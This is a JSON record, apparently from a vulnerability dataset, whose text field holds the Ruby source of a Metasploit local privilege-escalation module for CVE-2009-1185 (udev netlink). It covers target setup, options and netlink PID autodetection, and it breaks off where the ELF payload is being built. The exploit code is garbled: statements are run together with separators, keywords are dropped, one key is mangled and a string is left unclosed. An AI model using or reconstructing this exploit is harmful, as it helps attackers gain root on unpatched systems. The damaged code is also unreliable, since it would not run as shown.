{
    "text": "vul_name : Linux udev Netlink Local Privilege Escalation ， vul_cve : CVE-2009-1185 ， vul_poc :  ，  # This file is part of the Metasploit Framework and may be subject to ，  # redistribution and commercial restrictions. Please see the Metasploit ，  # web site for more information on licensing and terms of use. ， require 'msf/core' ， require 'rex' ， require 'msf/core/post/common' ， require 'msf/core/post/file' ， require 'msf/core/post/linux/priv' ， require 'msf/core/exploit/local/linux_kernel' ， require 'msf/core/exploit/local/linux' ， require 'msf/core/exploit/local/unix' ，  # load 'lib/msf/core/post/file.rb' ，  # load 'lib/msf/core/exploit/local/unix.rb' ，  # load 'lib/msf/core/exploit/local/linux.rb' ，  # load 'lib/msf/core/exploit/local/linux_kernel.rb' ， class Metasploit4 < Msf : Exploit : Local ， Rank = GreatRanking ， include Msf : Exploit : EXE ， include Msf : Post : File ， include Msf : Post : Common ， include Msf : Exploit : Local : LinuxKernel ， include Msf : Exploit : Local : Linux ， include Msf : Exploit : Local : Unix ， super ( update_info ( info , { ， 'Name' => 'Linux udev Netlink Local Privilege Escalation' ,  ， 'Description' => %q{ ， Versions of udev < 1.4.1 do not verify that netlink messages are ， coming from the kernel. This allows local users to gain privileges by ， sending netlink messages from userland. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'kcope' ,  # discovery ， 'Jon Oberheide' ,  # 95-udev-late.rules technique ， 'egypt' # metasploit module ，  ]  ,  ， 'Platform' => [ 'linux' ]  ,  ， 'Arch' => [ ARCH_X86 ]  ,  ， 'SessionTypes' => [ 'shell' , 'meterpreter' ]  ,  ， ' ，  [  ，  [ 'CVE' , '2009-1185' ]  ,  ，  [ 'BID' , '34536' ]  ,  ，  ]  ,  ， 'Targets' => ，  [  ，  [ 'Linux x86' , { 'Arch' => ARCH_X86 } ]  ,  ，  [ 'Linux x64' , { 'Arch' => ARCH_X86_64 } ]  ,  ，  #  [ 'Command payload' , { 'Arch' => ARCH_CMD } ]  ,  ，  ]  ,  ， 'DefaultOptons' => { 'WfsDelay' => 2 } ,  ， 'DefaultTarget' => 0 ,  ， 'DisclosureDate' => \" ,  ， } ， register_options (  [  ， OptString.new ( \"WritableDir\" ,  [ true , \"A directory where we can write files ( must not be mounted noexec ) \" , \"/tmp\" ]  )  ,  ， OptInt.new ( \"NetlinkPID\" ,  [ false , \"Usually udevd pid-1. Meterpreter sessions will autodetect\" ]  )  ,  ，  ]  , self.class )  ， end ， def exploit ， netlink_pid = datastore [ \"NetlinkPID\" ]  ， print_status ( \"Attempting to autodetect netlink pid.\" )  ， netlink_pid = autodetect_netlink_pid ， end ， print_error \"Couldn't autodetect netlink PID , try specifying it manually.\" ， print_error \"Look in /proc/net/netlink for a PID near that of the udevd process\" ， print_good \"Found netlink pid :  # {netlink_pid}\" ， end ， sc = Metasm : ELF.new (  @ cpu )  ， sc.parse %Q | ",
    "time": "2012.09.14"
}